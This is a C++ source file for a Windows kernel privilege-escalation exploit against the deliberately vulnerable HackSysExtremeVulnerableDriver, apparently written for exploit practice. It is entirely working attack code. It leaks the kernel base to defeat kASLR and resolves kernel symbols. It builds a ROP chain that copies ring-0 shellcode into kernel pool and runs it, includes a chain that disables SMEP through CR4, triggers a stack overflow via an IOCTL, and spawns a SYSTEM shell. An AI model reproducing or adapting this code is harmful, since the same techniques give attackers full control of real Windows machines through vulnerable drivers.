#pragma warning(disable: 4996)
#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <Psapi.h>
#include "ExploitData.h"

#define HEVD_DEVICENAME	"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL(opcode) CTL_CODE(FILE_DEVICE_UNKNOWN, opcode, METHOD_NEITHER, FILE_ANY_ACCESS)
#define STACK_OVERFLOW_OPCODE IOCTL(0x800)
#define LAYER_SIZE = 0x8

bool initialize();
void kernel_exploit();

unsigned long long _kernel_ExAllocatePoolWithTag = 0;
unsigned long long _kernel_RtlCopyMemoryNonTemporal = 0;
unsigned long long _shellcodeBuffer = 0;

int _version = 0;
std::string _OS = "";

int main() {
	if (initialize()) return 0;
	kernel_exploit();
	return 0;
}

void checkVersion() {
	using namespace std;

	HKEY hKey;
	const char* subKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";

	const char* q_ProductName = "ProductName";
	const char* q_BuildNumber = "CurrentBuildNumber";

	char r_ProductName[255];
	char r_BuildNumber[255];

	DWORD bufferSize = 255;
	RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey);

	RegQueryValueExA(hKey, q_ProductName, NULL, NULL, (LPBYTE)r_ProductName, &bufferSize);
	_OS = string(r_ProductName, bufferSize - 1);

	RegQueryValueExA(hKey, q_BuildNumber, NULL, NULL, (LPBYTE)r_BuildNumber, &bufferSize);
	_version = stoi(r_BuildNumber);

	RegCloseKey(hKey);

	cout << "[+] Current Version : " << _OS << " Build " << _version << endl;

	return;
}

bool initialize() {
	using namespace std;

	cout << BANNER << endl;
	checkVersion();

	if (_version != 14393 && _version != 19045 && _version != 22631) {
		cout << "[!] Exploit no support this version !" << endl;
		return true;
	}

	return false;
}

bool getHandle(HANDLE &h) {
	h = CreateFileA(
		HEVD_DEVICENAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (h == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to get handle.\n");
		return true;
	}

	return false;
}

LPVOID getKernelBase() {
	LPVOID drivers[1024];
	DWORD cbNeeded;

	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);

	return drivers[0];
}

unsigned long long getKernelSymbolAddress(HMODULE userKernelBase, LPVOID kernelBase, LPCSTR symbol) {
	unsigned long long offset = 0;

	LPVOID symbolAddr = GetProcAddress(userKernelBase, symbol);
	if (symbolAddr == NULL) return NULL;

	return (unsigned long long)symbolAddr - (unsigned long long)userKernelBase + (unsigned long long)kernelBase;
}

DWORD spawnCMD() {
	LPSTR CMD = (LPSTR)"C:\\Windows\\System32\\cmd.exe";
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	bool result = CreateProcessA(CMD, NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	if (result == 0) return 0;
	return pi.dwProcessId;
}

bool generateRing0Shellcode(LPVOID &shellcodePointer) {

	shellcodePointer = VirtualAlloc(NULL, sizeof(win11Ring0Shellcode)+0x10, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (shellcodePointer == NULL) {
		std::cout << "[!] Failed to allocate shellcode buffer :(" << std::endl;
		return true;
	}

	memcpy((char*)shellcodePointer, win11Ring0Shellcode, sizeof(win11Ring0Shellcode));

	return false;
}

bool bypasskASLR(LPVOID& kernelBase, HMODULE& userKernelBase) {
	using namespace std;

	LPCSTR ntoskrnlPath = "C:\\Windows\\System32\\ntoskrnl.exe";
	kernelBase = getKernelBase();
	userKernelBase = LoadLibraryA(ntoskrnlPath);

	if (kernelBase == 0) {
		cout << "[!] Failed to get kernel base :(" << endl;
		return true;
	}
	else if (userKernelBase == NULL) {
		cout << "[!] Failed to get ntoskrnl.exe handle :(" << endl;
		return true;
	}

	cout << "[+] Successful Leak KernelBase : " << kernelBase << endl;
	cout << "[+] Successful Load UserSpace Kernel Handler : " << userKernelBase << endl;

	return false;
}

bool getKeySymbols(LPVOID kernelBase, HMODULE userKernelBase) {
	using namespace std;

	_kernel_ExAllocatePoolWithTag = getKernelSymbolAddress(userKernelBase, kernelBase, "ExAllocatePoolWithTag");
	_kernel_RtlCopyMemoryNonTemporal = getKernelSymbolAddress(userKernelBase, kernelBase, "RtlCopyMemoryNonTemporal");

	if (_kernel_ExAllocatePoolWithTag == NULL) {
		cout << "[!] Failed to leak ExAllocatePoolWithTag address :(" << endl;
		return true;
	}
	else if (_kernel_RtlCopyMemoryNonTemporal == NULL) {
		cout << "[!] Failed to leak RtlCopyMemoryNonTemporal address :(" << endl;
		return true;
	}

	cout << "[+] Successful Leak ExAllocatePoolWithTag Address : " << (LPVOID)_kernel_ExAllocatePoolWithTag << endl;
	cout << "[+] Successful Leak RtlCopyMemoryNonTemporal Address : " << (LPVOID)_kernel_RtlCopyMemoryNonTemporal << endl;

	return false;
}

void addPayload(LPVOID& buffer, SIZE_T& offset, unsigned long long payload) {
	memcpy((char*)buffer + offset, &payload, 8);
	offset += 8;
	return;
}

void build_CopyShellcodeROP(LPVOID& buffer, SIZE_T offset, int OS) {

	// Setup Parameter of the ExAllocatePoolWithTag
	// PoolType
	addPayload(buffer, offset, ROP_Gadgets[OS][0]); // xor ecx, ecx ; mov rax, rcx ; ret
	// NumberOfBytes
	addPayload(buffer, offset, ROP_Gadgets[OS][1]); // pop rdx ; ret
	addPayload(buffer, offset, ROP_ExploitData[0]); // 0x1000

	// Call ExAllocatePoolWithTag
	addPayload(buffer, offset, _kernel_ExAllocatePoolWithTag);
	addPayload(buffer, offset, ROP_Gadgets[OS][2]); // add rsp, 0x20 ; ret
	offset += 0x20;

	// Storge Result of the ExAllocatePoolWithTag
	addPayload(buffer, offset, ROP_Gadgets[OS][3]); // push rax, pop rdi ; ret

	// Setup Parameter of the memcpy
	// dest
	addPayload(buffer, offset, ROP_Gadgets[OS][7]); // push rax ; pop r13 ; ret
	addPayload(buffer, offset, ROP_Gadgets[OS][6]); // xchg r8, r13 ; ret
	addPayload(buffer, offset, ROP_Gadgets[OS][5]); // mov rcx, r8 ; mov rax, rcx ; ret
	// src
	addPayload(buffer, offset, ROP_Gadgets[OS][1]); // pop rdx ; ret
	addPayload(buffer, offset, _shellcodeBuffer);
	// count
	addPayload(buffer, offset, ROP_Gadgets[OS][8]); // pop r8 ; ret
	addPayload(buffer, offset, ROP_ExploitData[1]); // 0x100

	// Call memcpy
	addPayload(buffer, offset, _kernel_RtlCopyMemoryNonTemporal);

	// Jump to shellcode
	addPayload(buffer, offset, ROP_Gadgets[OS][4]); // jmp rdi

	return;
}

void build_DisableSMEPROP(LPVOID& buffer, SIZE_T offset, int OS) {
	addPayload(buffer, offset, ROP_Gadgets[OS][10]); // pop rcx ; ret
	addPayload(buffer, offset, ROP_ExploitData[2]);  // CR4 Value
	addPayload(buffer, offset, ROP_Gadgets[OS][9]);  // mov cr4, rcx ; ret
	addPayload(buffer, offset, _shellcodeBuffer);

	return;
}

bool pooledPayload(LPVOID &exploitBuffer, SIZE_T bufferSize, LPVOID kernelBase) {
	using namespace std;

	SIZE_T offset = OFFSET; // 2072
	int OS = 0;

	switch (_version) {
	case 19045:
		OS = 0;
		break;
	case 14393:
		OS = 1;
		break;
	case 22631:
		OS = 2;

	}

	cout << "[+] Pooling Shellcode..." << endl;

	LPVOID shellcodeBuffer;
	
	if (generateRing0Shellcode(shellcodeBuffer)) return true;

	_shellcodeBuffer = (unsigned long long)shellcodeBuffer;

	cout << "[+] Successful Pooled shellcode" << endl;
	cout << "[+] Current ROP Based OS Build Version : " << _version << endl;
	cout << "[+] Rebase ROP Chains...";

	for (unsigned int i = 0; i < ROP_Gadgets.size(); i++) {
		for (unsigned int j = 0; j < ROP_Gadgets[i].size(); j++) {
			ROP_Gadgets[i][j] += (unsigned long long)kernelBase;
		}
	}
	cout << "Done" << endl;

	exploitBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memset((char*)exploitBuffer, 'A', offset);

	build_CopyShellcodeROP(exploitBuffer, offset, OS);
	//build_DisableSMEPROP(exploitBuffer, offset, OS);

	printf("[+] Payload pooled, sending malicious payload ;)\n");

	return false;
}

void kernel_exploit() {
	using namespace std;

	HANDLE h;

	LPVOID exploitBuffer;
	SIZE_T bufferSize = 0x900;

	LPVOID kernelBase;
	HMODULE userKernelBase;
	
	if (getHandle(h)) return;
	if (bypasskASLR(kernelBase, userKernelBase)) return;
	if (getKeySymbols(kernelBase, userKernelBase)) return;
	if (pooledPayload(exploitBuffer, bufferSize, kernelBase)) return;

	bool result = DeviceIoControl(h, STACK_OVERFLOW_OPCODE, exploitBuffer, (DWORD)bufferSize, NULL, 0, NULL, NULL);

	if (!result) printf("[!] IOCTL Failed %X\n", GetLastError());

	cout << "[+] Payload Send !" << endl;
	cout << "[+] Spawning shell from SYSTEM privilege..." << endl << endl;

	spawnCMD();

	return;
}
